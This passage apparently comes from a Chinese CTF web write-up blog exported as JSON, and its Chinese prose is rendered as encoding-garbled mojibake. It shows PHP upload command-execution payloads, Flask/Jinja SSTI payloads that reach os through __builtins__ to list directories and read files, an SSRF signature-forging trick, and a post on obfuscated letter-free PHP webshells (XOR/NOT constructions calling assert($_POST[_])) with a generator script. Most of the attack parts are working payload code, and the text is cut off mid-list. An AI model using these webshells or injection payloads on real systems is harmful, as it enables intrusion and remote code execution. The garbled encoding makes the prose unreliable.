&#x27;/&#x27;;if(!file_exists($dir))&#123; mkdir($dir);&#125;switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123; case &#x27;pwd&#x27;: echo $dir; break; case &#x27;upload&#x27;: $data = $_GET[&quot;data&quot;] ?? &quot;&quot;; waf($data); file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);&#125;?&gt; æˆ‘ä»¬è¦ä¸Šä¼ ä¸¤ä¸ªå‚æ•°ï¼Œactionè¡¨ç¤ºæ¨¡å¼ï¼Œdataè¡¨ç¤ºå†™å…¥index.phpä¸­çš„å†…å®¹ã€‚å‘ç°wafæŠŠphpè¿‡æ»¤äº†ï¼Œå› æ­¤è¦ç”¨åˆ°çŸ­æ ‡ç­¾ï¼Œè€Œç©ºæ ¼è¢«è¿‡æ»¤ï¼Œåœ¨phpä¸­å¯ä»¥ç”¨%09æ›¿ä»£ï¼Œpayloadï¼š 1?action=upload&amp;data=&lt;?echo%09`ls%09/`?&gt; å†™å…¥åè®¿é—®pwdç»™å‡ºçš„è·¯å¾„ï¼Œå³å¯å‘ç°å‘½ä»¤è¢«æ‰§è¡Œï¼Œå› æ­¤æˆ‘ä»¬è¯»å–flagæ–‡ä»¶ï¼š 1?action=upload&amp;data=&lt;?echo%09`cat%09/flllllll1112222222lag`?&gt; [GYCTF2020]FlaskAppæœ‰ä¸€ä¸ªbase64åŠ å¯†ä¸base64è§£å¯†ç½‘é¡µï¼Œå°†&#123;&#123;2+2&#125;&#125;è¿›è¡Œbase64åŠ å¯†åè¿›è¡Œè§£å¯†ï¼Œå‘ç°ç»“æœä¸º4ï¼Œè¯´æ˜å­˜åœ¨sstiã€‚ä½†æ˜¯æ„å»ºpayloadçš„æ—¶å€™å‘ç°æœ‰ä¸œè¥¿è¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œè¦bypassã€‚ æ ¹æ®æç¤ºå‘ç°debugé¡µé¢ï¼Œå‘ç°æºç ä¸ºapp.pyï¼Œå› æ­¤æ˜¯python flaskã€‚ æˆ‘ä»¬å…ˆè¯»å–æºç ï¼š 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; å‘ç°wafï¼š 1def waf(str): black_list = [&amp;#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;, &amp;#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;] for x in black_list : if x in str.lower() : return 1 @app.route(&amp;#39;/hint&amp;#39;,methods=[&amp;#39;GET&amp;#39;]) def hint(): txt = &amp;#34;å¤±è´¥ä¹ƒæˆåŠŸä¹‹æ¯ï¼ï¼&amp;#34 htmlè§£ç ï¼š 1&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;, &quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot; å› æ­¤è¿™é‡Œéœ€è¦è¿›è¡Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œéå†ç›®å½•payloadï¼š 12345payload1:&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).listdir(&#x27;/&#x27;)&#125;&#125;payload2:&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).listdir(&#x27;/&#x27;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; è¯»å–flagï¼š 12345payload1:&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;txt.galf_eht_si_siht/&#x27;[::-1],&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;payload2:&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/this_is_the_fl&#x27;+&#x27;ag.txt&#x27;,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; [WesternCTF2018]shrineçœ‹åˆ°é¢˜ç›®å°±æƒ³åˆ°åº”è¯¥æ˜¯shrineæ¨¡æ¿æ³¨å…¥ï¼Œè¿›è¡Œæµ‹è¯•ï¼š 1/shrine/&#123;&#123;2+2&#125;&#125; å›æ˜¾æ˜¯4ï¼Œè¯´æ˜å­˜åœ¨sstiã€‚æ¨æµ‹&#123;undefined&#123;config&#125;&#125;å¯æŸ¥çœ‹æ‰€æœ‰app.configå†…å®¹ï¼Œä½†æ˜¯è¿™é¢˜è®¾äº†é»‘åå•[â€˜configâ€™,â€˜selfâ€™]å¹¶ä¸”è¿‡æ»¤äº†æ‹¬å·ã€‚ä¸è¿‡pythonè¿˜æœ‰ä¸€äº›å†…ç½®å‡½æ•°ï¼Œæ¯”å¦‚url_forå’Œget_flashed_messagesã€‚ payloadï¼š 12345/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;/shrine/&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;/shrine/&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125; å‡å¯å¾—åˆ°flagã€‚ [De1CTF 2019]SSRF Meè¿›å…¥ç½‘é¡µçœ‹ç€ä¸€ä¸²ä»£ç å¤´éƒ½å¤§äº†ï¼Œè‡ªå·±é‡æ–°ç¼–è¾‘ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#! /usr/bin/env python# #encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding(&#x27;latin1&#x27;) app = Flask(__name__) secert_key = os.urandom(16) class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): os.mkdir(self.sandbox) def Exec(self): result = &#123;&#125; result[&#x27;code&#x27;] = 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;w&#x27;) resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result[&#x27;data&#x27;] = resp else: print resp tmpfile.write(resp) tmpfile.close() result[&#x27;code&#x27;] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;r&#x27;) result[&#x27;code&#x27;] = 200 result[&#x27;data&#x27;] = f.read() if result[&#x27;code&#x27;] == 500: result[&#x27;data&#x27;] = &quot;Action Error&quot; else: result[&#x27;code&#x27;] = 500 result[&#x27;msg&#x27;] = &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False @app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; return getSign(action, param) @app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr if(waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec()) @app.route(&#x27;/&#x27;)def index(): return open(&quot;code.txt&quot;,&quot;r&quot;).read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return &quot;Connection Timeout&quot; def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check=param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return Falseif __name__ == &#x27;__main__&#x27;: app.debug = False app.run(host=&#x27;0.0.0.0&#x27;,port=9999) çœ‹èµ·æ¥æŒºå¤æ‚çš„ï¼Œä½†æ ¸å¿ƒå…¶å®å°±ä¸¤ä¸ªè·¯ç”±ï¼š/geneSignå’Œ/De1taã€‚æˆ‘ä»¬å‘ç°/geneSignè·¯ç”±æ˜¯å°†paramå’Œactionæ‹¼æ¥è€Œæˆçš„ï¼Œæ¥ç€è¿”å›åˆ°getSign()ä¸­ï¼Œè¿›è¡Œmd5åŠ å¯†ã€‚ æ¥ç€æ˜¯/De1taè·¯ç”±ï¼Œåœ¨è¿™ä¸ªè·¯ç”±ä¸­è·å–ä¸‰ä¸ªå˜é‡ï¼ŒGETè·å–paramï¼ŒCookieè·å–actionå’Œsignï¼Œåœ¨æ£€æŸ¥çš„æ—¶å€™è¦æ»¡è¶³getSign(self.action, self.param) == self.signã€‚ å› æ­¤æˆ‘ä»¬è¿™æ ·æ„å»ºpayloadï¼Œé¦–å…ˆï¼š 123/geneSign?param=flag.txtread//175fadbcd603662b8637028cae3aaf1e è¿™æ ·ç›¸å½“äºæˆ‘ä»¬è·å¾—äº†ä¸€ä¸ªflag.txtreadscançš„signå€¼ï¼Œæ¥ç€ï¼š 12/De1ta?param=flag.txtCookie: action=readscan;sign=175fadbcd603662b8637028cae3aaf1e è¿™ç›¸å½“äºæˆ‘ä»¬çš„getSign(self.action, self.param)ä¸ºflag.txt+readscanï¼Œå’Œsignå¯¹åº”ä¸Šäº†ï¼Œè€Œè¿™æ ·åˆèƒ½å°†paramä¸­æ–‡ä»¶å†…å®¹è¯»å‡ºå¹¶è¿”å›ç»™æˆ‘ä»¬ï¼Œä»¥æ­¤è·å–flagã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"ç‰¹æ®Šwebshellçš„æ„å»º","slug":"ç‰¹æ®Šwebshellçš„æ„å»º","date":"2022-03-05T06:44:09.000Z","updated":"2022-03-06T09:15:25.655Z","comments":true,"path":"2022/03/05/ç‰¹æ®Šwebshellçš„æ„å»º/","link":"","permalink":"http://example.com/2022/03/05/%E7%89%B9%E6%AE%8Awebshell%E7%9A%84%E6%9E%84%E5%BB%BA/","excerpt":"å‰è¨€ è¿™ä¸ªå‘å°±ç›´æ¥å¡«äº†å§ï¼Œæ¯•ç«Ÿè¿™ä¸œè¥¿è¿˜æ˜¯å¾ˆæœ‰æ„æ€çš„ï¼Œè€Œä¸”å¯¹å¾ˆå¤šwaféƒ½å¯ä»¥èµ·åˆ°å¾ˆå¥½çš„æ•ˆæœã€‚","text":"å‰è¨€ è¿™ä¸ªå‘å°±ç›´æ¥å¡«äº†å§ï¼Œæ¯•ç«Ÿè¿™ä¸œè¥¿è¿˜æ˜¯å¾ˆæœ‰æ„æ€çš„ï¼Œè€Œä¸”å¯¹å¾ˆå¤šwaféƒ½å¯ä»¥èµ·åˆ°å¾ˆå¥½çš„æ•ˆæœã€‚ æ— å­—ç¬¦webshellä¼—æ‰€å‘¨çŸ¥ï¼Œæˆ‘ä»¬ç»å¸¸å†™å…¥çš„webshellä¸å¤–ä¹å°±æ˜¯é‚£äº›å¸¸è§çš„ä¸€å¥ç ï¼Œæœ€å¤šè¿‡æ»¤ä¸€äº›å…³é”®å­—æˆ–è€…å…³é”®ç¬¦å·ã€‚ä½†æ˜¯æœ‰äº›é¢˜ç›®ï¼Œå´ä¸å…è®¸æˆ‘ä»¬ä¸Šä¼ çš„webshellä¸­å­˜åœ¨æ•°å­—ä¸å­—æ¯ï¼Œè¿™æ—¶å€™å°±éœ€è¦ç¼–é€ ç‰¹æ®Šçš„webshellæ¥ç»•è¿‡äº†ã€‚ ç¼–å†™è¿™ç±»æ— å­—ç¬¦webshellçš„æ ¸å¿ƒå°±æ˜¯ï¼Œå°†éå­—æ¯ã€æ•°å­—çš„å­—ç¬¦ç»è¿‡å„ç§å˜æ¢ï¼Œæœ€åèƒ½æ„é€ å‡ºa-zä¸­ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚ç„¶åå†åˆ©ç”¨PHPå…è®¸åŠ¨æ€å‡½æ•°æ‰§è¡Œçš„ç‰¹ç‚¹ï¼Œæ‹¼æ¥å¤„ä¸€ä¸ªå‡½æ•°åï¼Œç„¶ååŠ¨æ€æ‰§è¡Œä¹‹å³å¯ã€‚ æ–¹æ³•ä¸€åˆ©ç”¨phpä¸¤ä¸ªå­—ç¬¦ä¸²å¼‚æˆ–åå¾—åˆ°çš„ä»æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²çš„æ“ä½œï¼Œé€šè¿‡å¼‚æˆ–æ¥ä»£æ›¿å­—æ¯ä¸æ•°å­—ï¼Œè¾¾åˆ°ç»•è¿‡çš„ç›®çš„ï¼š 12345&lt;?php$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;); // $_=&#x27;assert&#x27;;$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;); // $__=&#x27;_POST&#x27;;$___=$$__;$_($___[_]); // assert($_POST[_]); å½“ç„¶æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªè„šæœ¬è·å–å¼‚æˆ–å€¼ï¼š 1234&lt;?phpfor($i=128;$i&lt;255;$i++)&#123; echo sprintf(&quot;%s^%s&quot;,urlencode(chr($i)),urlencode(chr(255))).&quot;=&gt;&quot;. (chr($i)^chr(255)).&quot;\\n&quot;;&#125;?&gt; æ–¹æ³•äºŒé™¤äº†å¼‚æˆ–ï¼Œåœ¨phpä¸­ï¼Œå–åä¹Ÿæ˜¯å¯ä»¥å¾—åˆ°å­—ç¬¦ä¸²çš„ï¼Œä¾‹å¦‚&#39;å’Œ&#39;&#123;2&#125;çš„ç»“æœä¸º&quot;\\x8c&quot;ï¼Œå…¶å–åå°±ä¸ºsã€‚ è¿™ç§æ˜¯åˆ©ç”¨ä¸­æ–‡utf-8ç¼–ç çš„æ€§è´¨æ¥å–åçš„ï¼Œå’Œçš„utf-8ç¼–ç çš„ç¬¬ä¸‰éƒ¨åˆ†çš„å–åç»“æœä¸ºsï¼Œç„¶ååˆ©ç”¨è¿™ä¸ªæ€§è´¨ï¼Œé‡‡ç”¨.=çš„æ–¹å¼é€ä¸ªå åŠ æˆé©¬ã€‚è€Œç”¨åˆ°çš„0~2æ•°å­—æˆ‘ä»¬å¯ä»¥é€šè¿‡å­—ç¬¦æ¯”è¾ƒå¤§å°æ–¹å¼ç¡®å®šä¸€ä¸ª0æˆ–è€…1ï¼Œç„¶åå†é€šè¿‡++æˆ–è€…â€“çš„æ–¹å¼å–åˆ°ä¸€ä¸ªä»»æ„å¤§å°çš„æ•°å­—ã€‚ æ”¾ä¸€ä¸ªpayloadï¼š 12345678910111213&lt;?php$__=(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;)+(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;);$_=$__/$__;$____=&#x27;&#x27;;$___=&quot;ç°&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;å’Œ&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;å’Œ&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;çš„&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;åŠ&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;å§‹&quot;;$____.=~($___&#123;$__&#125;);$_____=&#x27;_&#x27;;$___=&quot;ä¿¯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;ç°&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;æ¬¡&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;ç«™&quot;;$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[$__]);//assert($_POST[_]); æˆ–è€…æˆ‘ä»¬ç›´æ¥ç”¨æ±‰å­—å–åï¼Œç„¶åé€šè¿‡.=çš„æ–¹å¼æ„å»ºpayloadï¼š 123456789101112131415161718192021222324&lt;?php$_++; //å¾—åˆ°1ï¼Œæ­¤æ—¶$_=1$__ = &quot;æ&quot;;$___ = ~($__&#123;$_&#125;); //å¾—åˆ°aï¼Œæ­¤æ—¶$___=&quot;a&quot;$__ = &quot;åŒº&quot;;$___ .= ~($__&#123;$_&#125;); //å¾—åˆ°sï¼Œæ­¤æ—¶$___=&quot;as&quot;$___ .= ~($__&#123;$_&#125;); //æ­¤æ—¶$___=&quot;ass&quot;$__ = &quot;çš®&quot;;$___ .= ~($__&#123;$_&#125;); //å¾—åˆ°eï¼Œæ­¤æ—¶$___=&quot;asse&quot;$__ = &quot;å&quot;;$___ .= ~($__&#123;$_&#125;); //å¾—åˆ°rï¼Œæ­¤æ—¶$___=&quot;asser&quot;$__ = &quot;å‹º&quot;;$___ .= ~($__&#123;$_&#125;); //å¾—åˆ°tï¼Œæ­¤æ—¶$___=&quot;assert&quot;$____ = &#x27;_&#x27;; //$____=&#x27;_&#x27;$__ = &quot;å¯¸&quot;;$____ .= ~($__&#123;$_&#125;); //å¾—åˆ°Pï¼Œæ­¤æ—¶$____=&quot;_P&quot;$__ = &quot;å°&quot;;$____ .= ~($__&#123;$_&#125;); //å¾—åˆ°Oï¼Œæ­¤æ—¶$____=&quot;_PO&quot;$__ = &quot;æ¬ &quot;;$____ .= ~($__&#123;$_&#125;); //å¾—åˆ°Sï¼Œæ­¤æ—¶$____=&quot;_POS&quot;$__ = &quot;ç«‹&quot;;$____ .= ~($__&#123;$_&#125;); //å¾—åˆ°Tï¼Œæ­¤æ—¶$____=&quot;_POST&quot;$_ = $$____; //$_ = $_POST$___($_[_]); //assert($_POST[_])&gt; å¯ä»¥ç”¨ä¸‹é¢è¿™ä¸ªexpè·å–å–åçš„å­—ç¬¦ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;?phpheader(&quot;Content-type:text/html;charset=utf-8&quot;);$shell = &quot;system&quot;;$result = &quot;&quot;;$arr =array();$word = &quot;ä¸€ä¹™äºŒåä¸å‚ä¸ƒåœäººå…¥å…«ä¹å‡ å„¿äº†åŠ›ä¹ƒåˆ€åˆä¸‰äºå¹²äºå£«å·¥åœŸæ‰å¯¸ä¸‹å¤§ä¸ˆä¸ä¸‡ä¸Šå°å£å·¾å±±åƒä¹å·äº¿ä¸ªå‹ºä¹…å‡¡åŠå¤•ä¸¸ä¹ˆå¹¿äº¡é—¨ä¹‰ä¹‹å°¸å¼“å·±å·²å­å«ä¹Ÿå¥³é£åˆƒä¹ å‰é©¬ä¹¡ä¸°ç‹äº•å¼€å¤«å¤©æ— å…ƒä¸“äº‘æ‰è‰ºæœ¨äº”æ”¯å…ä¸å¤ªçŠ¬åŒºå†å°¤å‹åŒ¹è½¦å·¨ç‰™å±¯æ¯”äº’åˆ‡ç“¦æ­¢å°‘æ—¥ä¸­å†ˆè´å†…æ°´è§åˆç‰›æ‰‹æ¯›æ°”å‡é•¿ä»ä»€ç‰‡ä»†åŒ–ä»‡å¸ä»ä»…æ–¤çˆªåä»‹çˆ¶ä»ä»Šå‡¶åˆ†ä¹å…¬ä»“æœˆæ°å‹¿æ¬ é£ä¸¹åŒ€ä¹Œå‡¤å‹¾æ–‡å…­æ–¹ç«ä¸ºæ–—å¿†è®¢è®¡æˆ·è®¤å¿ƒå°ºå¼•ä¸‘å·´å­”é˜ŸåŠä»¥å…äºˆåŠåŒä¹¦å¹»ç‰åˆŠç¤ºæœ«æœªå‡»æ‰“å·§æ­£æ‰‘æ‰’åŠŸæ‰”å»ç”˜ä¸–å¤èŠ‚æœ¬æœ¯å¯ä¸™å·¦å‰å³çŸ³å¸ƒé¾™å¹³ç­è½§ä¸œå¡åŒ—å ä¸šæ—§å¸…å½’ä¸”æ—¦ç›®å¶ç”²ç”³å®ç”µå·ç”°ç”±å²åªå¤®å…„å¼å«å¦å¨å¹å››ç”Ÿå¤±ç¦¾ä¸˜ä»˜ä»—ä»£ä»™ä»¬ä»ªç™½ä»”ä»–æ–¥ç“œä¹ä¸›ä»¤ç”¨ç”©å°ä¹å¥åŒ†å†ŒçŠ¯å¤–å¤„å†¬é¸ŸåŠ¡åŒ…é¥¥ä¸»å¸‚ç«‹é—ªå…°åŠæ±æ±‡å¤´æ±‰å®ç©´å®ƒè®¨å†™è®©ç¤¼è®­å¿…è®®è®¯è®°æ°¸å¸å°¼æ°‘å‡ºè¾½å¥¶å¥´åŠ å¬çš®è¾¹å‘å­•åœ£å¯¹å°çŸ›çº æ¯å¹¼ä¸å¼åˆ‘åŠ¨æ‰›å¯ºå‰æ‰£è€ƒæ‰˜è€æ‰§å·©åœ¾æ‰©æ‰«åœ°æ‰¬åœºè€³å…±èŠ’äºšèŠæœ½æœ´æœºæƒè¿‡è‡£å†åè¥¿å‹åŒåœ¨æœ‰ç™¾å­˜è€Œé¡µåŒ å¤¸å¤ºç°è¾¾åˆ—æ­»æˆå¤¹è½¨é‚ªåˆ’è¿ˆæ¯•è‡³æ­¤è´å¸ˆå°˜å°–åŠ£å…‰å½“æ—©åå“è™«æ›²å›¢åŒåŠåƒå› å¸å—å±¿å¸†å²å›å²‚åˆšåˆ™è‚‰ç½‘å¹´æœ±å…ˆä¸¢èˆŒç«¹è¿ä¹”ä¼Ÿä¼ ä¹’ä¹“ä¼‘ä¼ä¼ä¼˜ä¼å»¶ä»¶ä»»ä¼¤ä»·ä»½åä»°ä»¿ä¼™ä¼ªè‡ªè¡€å‘ä¼¼åè¡ŒèˆŸå…¨ä¼šæ€åˆå…†ä¼ä¼—çˆ·ä¼åˆ›è‚Œæœµæ‚å±æ—¬æ—¨è´Ÿå„åå¤šäº‰è‰²å£®å†²å†°åº„åº†äº¦åˆ˜é½äº¤æ¬¡è¡£äº§å†³å……å¦„é—­é—®é—¯ç¾Šå¹¶å…³ç±³ç¯å·æ±—æ±¡æ±Ÿæ± æ±¤å¿™å…´å®‡å®ˆå®…å­—å®‰è®²å†›è®¸è®ºå†œè®½è®¾è®¿å¯»é‚£è¿…å°½å¯¼å¼‚å­™é˜µé˜³æ”¶é˜¶é˜´é˜²å¥¸å¦‚å¦‡å¥½å¥¹å¦ˆæˆç¾½è§‚æ¬¢ä¹°çº¢çº¤çº§çº¦çºªé©°å·¡å¯¿å¼„éº¦å½¢è¿›æˆ’åè¿œè¿è¿æ‰¶æŠšå›æŠ€åæ‰°æ‹’æ‰¾æ‰¹æ‰¯å€èµ°æŠ„åè´¡æ”»èµ¤æŠ˜æŠ“æ‰®æŠ¢å­å‡æŠ›æŠ•åŸæŠ—å‘åŠæŠ–æŠ¤å£³å¿—æ‰­å—å£°æŠŠæŠ¥å´åŠ«èŠ½èŠ±èŠ¹èŠ¬è‹èŠ³ä¸¥èŠ¦åŠ³å…‹è‹æ†æ æœææ‘ææææ¨æ±‚æ›´æŸè±†ä¸¤ä¸½åŒ»è¾°åŠ±å¦è¿˜æ­¼æ¥è¿æ­¥åšæ—±ç›¯å‘ˆæ—¶å´åŠ©å¿é‡Œå‘†å›­æ—·å›´å‘€å¨è¶³é‚®ç”·å›°åµä¸²å‘˜å¬å©å¹å‘œå§å¼åˆ«å²—å¸è´¢é’ˆé’‰å‘Šæˆ‘ä¹±åˆ©ç§ƒç§€ç§æ¯å…µä¼°ä½“ä½•ä½†ä¼¸ä½œä¼¯ä¼¶ä½£ä½ä½ ä½ä½ä¼´èº«çš‚ä½›è¿‘å½»å½¹è¿”ä½™å¸Œåè°·å¦¥å«é‚»å²”è‚è‚šè‚ é¾Ÿå…ç‹‚çŠ¹è§’åˆ æ¡åµå²›è¿é¥­é¥®ç³»è¨€å†»çŠ¶äº©å†µåºŠåº“ç–—åº”å†·è¿™åºè¾›å¼ƒå†¶å¿˜é—²é—´é—·åˆ¤ç¶ç¿å¼Ÿæ±ªæ²™æ±½æ²ƒæ³›æ²Ÿæ²¡æ²ˆæ²‰æ€€å¿§å¿«å®Œå®‹å®ç‰¢ç©¶ç©·ç¾è‰¯è¯å¯è¯„è¡¥åˆç¤¾è¯†è¯‰è¯Šè¯è¯‘å›çµå³å±‚å°¿å°¾è¿Ÿå±€æ”¹å¼ å¿Œé™…é™†é˜¿é™ˆé˜»é™„å¦™å¦–å¦¨åŠªå¿åŠ²é¸¡é©±çº¯çº±çº³çº²é©³çºµçº·çº¸çº¹çººé©´çº½å¥‰ç©ç¯æ­¦é’è´£ç°è¡¨è§„æŠ¹æ‹¢æ‹”æ‹£æ‹…å¦æŠ¼æŠ½æ‹æ‹–æ‹è€…é¡¶æ‹†æ‹¥æŠµæ‹˜åŠ¿æŠ±åƒæ‹‰æ‹¦æ‹Œå¹¸æ‹›å¡æŠ«æ‹¨æ‹©æŠ¬å…¶å–è‹¦è‹¥èŒ‚è‹¹è‹—è‹±èŒƒç›´èŒ„èŒèŒ…æ—ææ¯æŸœææ¿æ¾æªæ„æ°è¿°æ•ä¸§æˆ–ç”»å§äº‹åˆºæ£é›¨å–çŸ¿ç å•å¥”å¥‡å¥‹æ€æ¬§å„å¦»è½°é¡·è½¬æ–©è½®è½¯åˆ°éå”è‚¯é½¿äº›è™è™è‚¾è´¤å°šæ—ºå…·æœå‘³æ˜†å›½æ˜Œç•…æ˜æ˜“æ˜‚å…¸å›ºå¿ å’å‘¼é¸£å’å‘¢å²¸å²©å¸–ç½—å¸œå²­å‡¯è´¥è´©è´­å›¾é’“åˆ¶çŸ¥å‚ç‰§ç‰©ä¹–åˆ®ç§†å’Œå­£å§”ä½³ä¾ä¾›ä½¿ä¾‹ç‰ˆä¾„ä¾¦ä¾§å‡­ä¾¨ä½©è´§ä¾çš„è¿«è´¨æ¬£å¾å¾€çˆ¬å½¼å¾„æ‰€èˆé‡‘å‘½æ–§çˆ¸é‡‡å—ä¹³è´ªå¿µè´«è‚¤è‚ºè‚¢è‚¿èƒ€æœ‹è‚¡è‚¥æœèƒå‘¨æ˜é±¼å…”ç‹å¿½ç‹—å¤‡é¥°é¥±é¥²å˜äº¬äº«åº—å¤œåº™åºœåº•å‰‚éƒŠåºŸå‡€ç›²æ”¾åˆ»è‚²é—¸é—¹éƒ‘åˆ¸å·å•ç‚’ç‚Šç‚•ç‚ç‚‰æ²«æµ…æ³•æ³„æ²³æ²¾æ³ªæ²¹æ³Šæ²¿æ³¡æ³¨æ³»æ³³æ³¥æ²¸æ³¢æ³¼æ³½æ²»æ€–æ€§æ€•æ€œæ€ªå­¦å®å®—å®šå®œå®¡å®™å®˜ç©ºå¸˜å®è¯•éƒè¯—è‚©æˆ¿è¯šè¡¬è¡«è§†è¯è¯è¯¢è¯¥è¯¦å»ºè‚ƒå½•éš¶å±…å±Šåˆ·å±ˆå¼¦æ‰¿å­Ÿå­¤é™•é™é™å¦¹å§‘å§å§“å§‹é©¾å‚è‰°çº¿ç»ƒç»„ç»†é©¶ç»‡ç»ˆé©»é©¼ç»ç»è´¯å¥æ˜¥å¸®çç»æ¯’å‹æŒ‚å°æŒé¡¹å®æŒåŸæŒ æ”¿èµ´èµµæŒ¡æŒºæ‹¬æ‹´æ‹¾æŒ‘æŒ‡å«æŒ£æŒ¤æ‹¼æŒ–æŒ‰æŒ¥æŒªæŸç”šé©èå··å¸¦è‰èŒ§èŒ¶è’èŒ«è¡è£æ•…èƒ¡å—è¯æ ‡æ¯æŸ„æ ‹ç›¸æŸ¥æŸæŸ³æŸ±æŸ¿æ æ ‘è¦å’¸å¨æ­ªç ”ç –å˜åšç Œç é¢è€è€ç‰µæ®‹æ®ƒè½»é¸¦çš†èƒŒæˆ˜ç‚¹ä¸´è§ˆç«–çœå‰Šå°æ˜¯ç›¼çœ¨å“„æ˜¾å“‘å†’æ˜ 